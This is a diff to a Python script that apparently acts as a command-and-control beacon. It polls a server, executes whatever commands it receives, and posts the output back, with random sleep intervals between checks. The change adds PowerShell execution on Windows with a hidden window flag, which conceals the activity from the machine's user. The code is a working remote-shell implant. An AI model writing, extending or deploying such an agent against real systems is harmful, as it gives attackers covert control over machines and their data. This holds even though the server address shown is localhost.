@@ -12,6 +12,7 @@ import time
 import subprocess
 import requests
 import random
+import platform
 
 SERVER_IP = "127.0.0.1"
 PORT = 5000
@@ -28,9 +29,17 @@ def main():
         except Exception:
             continue
         if command:
-            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            out, err = process.communicate()
-            requests.post(f"{SERVER_URL}/result", json={"id": json["id"], "stdout": out.decode(), "stderr": err.decode()}, headers={"Content-Type": "application/json"})
+            errored = False
+            out = b""
+            try:
+                if platform.system() == "Windows":
+                    process = subprocess.Popen(["powershell", "/c", command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=subprocess.CREATE_NO_WINDOW)
+                else:
+                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                out, _ = process.communicate()
+            except:
+                errored = True
+            requests.post(f"{SERVER_URL}/result", json={"id": json["id"], "stdout": out.decode(), "errored": errored}, headers={"Content-Type": "application/json"})
 
         sleep_time = random.randint(5, 20)
         time.sleep(sleep_time)
